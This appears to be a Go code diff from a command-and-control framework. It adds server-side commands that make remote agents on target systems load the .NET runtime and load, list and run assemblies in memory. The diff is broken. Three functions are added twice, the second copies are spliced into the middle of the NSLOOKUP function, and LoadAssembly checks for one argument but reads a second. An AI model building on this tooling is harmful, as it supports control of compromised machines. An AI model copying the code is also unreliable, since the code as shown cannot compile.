@@ -506,6 +506,18 @@ func Hibernate(agentID uuid.UUID, Args []string) messages.UserMessage {
 	return messages.JobMessage(agentID, job)
 }
 
+// InvokeAssembly executes an assembly that was previously loaded with the load-assembly command
+func InvokeAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {
+	if len(Args) < 1 {
+		return messages.ErrorMessage("not enough arguments, the assembly name must be provided")
+	}
+	job, err := jobs.Add(agentID, Args[0], Args[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
 // Ipconfig lists the agent's network adapter information
 func Ipconfig(agentID uuid.UUID, Args []string) messages.UserMessage {
 	job, err := jobs.Add(agentID, "ifconfig", nil)
@@ -543,6 +555,46 @@ func KillProcess(agentID uuid.UUID, Args []string) messages.UserMessage {
 	return messages.ErrorMessage(fmt.Sprintf("not enough arguments provided for the Agent Kill call: %s", Args))
 }
 
+// ListAssemblies instructs the agent to list all of the .NET assemblies that are currently loaded into the agent's process
+// .NET assemblies are loaded with the LoadAssembly call
+func ListAssemblies(agentID uuid.UUID) messages.UserMessage {
+	job, err := jobs.Add(agentID, "list-assemblies", []string{})
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
+// LoadAssembly reads in a .NET assembly and sends it to the agent so it can be loaded
+// into a CLR AppDomain for later execution
+func LoadAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {
+	if len(Args) < 1 {
+		return messages.ErrorMessage("not enough arguments, an assembly must be provided")
+	}
+	_, err := os.Stat(Args[1])
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("there was an error accessing the assembly:\n%s", err))
+	}
+	job, err := jobs.Add(agentID, Args[0], Args[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
+// LoadCLR loads the .NET Common Language Runtime (CLR) into the agent's process
+// .NET assemblies can subsequently be loaded with the LoadAssembly call and executed with the InvokeAssembly call
+func LoadCLR(agentID uuid.UUID, Args []string) messages.UserMessage {
+	if len(Args) < 1 {
+		return messages.ErrorMessage("not enough arguments, a .NET version must be provided")
+	}
+	job, err := jobs.Add(agentID, Args[0], Args[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
 // Netstat is used to print network connections on the target system
 // Supports a "-p tcp" or "-p udp"
 func NETSTAT(agentID uuid.UUID, Args []string) messages.UserMessage {
@@ -574,6 +626,46 @@ func NSLOOKUP(agentID uuid.UUID, Args []string) messages.UserMessage {
 		return messages.ErrorMessage("not enough arguments. A query was not provided")
 	}
 	job, err := jobs.Add(agentID, "nslookup", Args[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
+// ListAssemblies instructs the agent to list all of the .NET assemblies that are currently loaded into the agent's process
+// .NET assemblies are loaded with the LoadAssembly call
+func ListAssemblies(agentID uuid.UUID) messages.UserMessage {
+	job, err := jobs.Add(agentID, "list-assemblies", []string{})
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
+// LoadAssembly reads in a .NET assembly and sends it to the agent so it can be loaded
+// into a CLR AppDomain for later execution
+func LoadAssembly(agentID uuid.UUID, Args []string) messages.UserMessage {
+	if len(Args) < 1 {
+		return messages.ErrorMessage("not enough arguments, an assembly must be provided")
+	}
+	_, err := os.Stat(Args[1])
+	if err != nil {
+		return messages.ErrorMessage(fmt.Sprintf("there was an error accessing the assembly:\n%s", err))
+	}
+	job, err := jobs.Add(agentID, Args[0], Args[1:])
+	if err != nil {
+		return messages.ErrorMessage(err.Error())
+	}
+	return messages.JobMessage(agentID, job)
+}
+
+// LoadCLR loads the .NET Common Language Runtime (CLR) into the agent's process
+// .NET assemblies can subsequently be loaded with the LoadAssembly call and executed with the InvokeAssembly call
+func LoadCLR(agentID uuid.UUID, Args []string) messages.UserMessage {
+	if len(Args) < 1 {
+		return messages.ErrorMessage("not enough arguments, a .NET version must be provided")
+	}
+	job, err := jobs.Add(agentID, Args[0], Args[1:])
 	if err != nil {
 		return messages.ErrorMessage(err.Error())
 	}
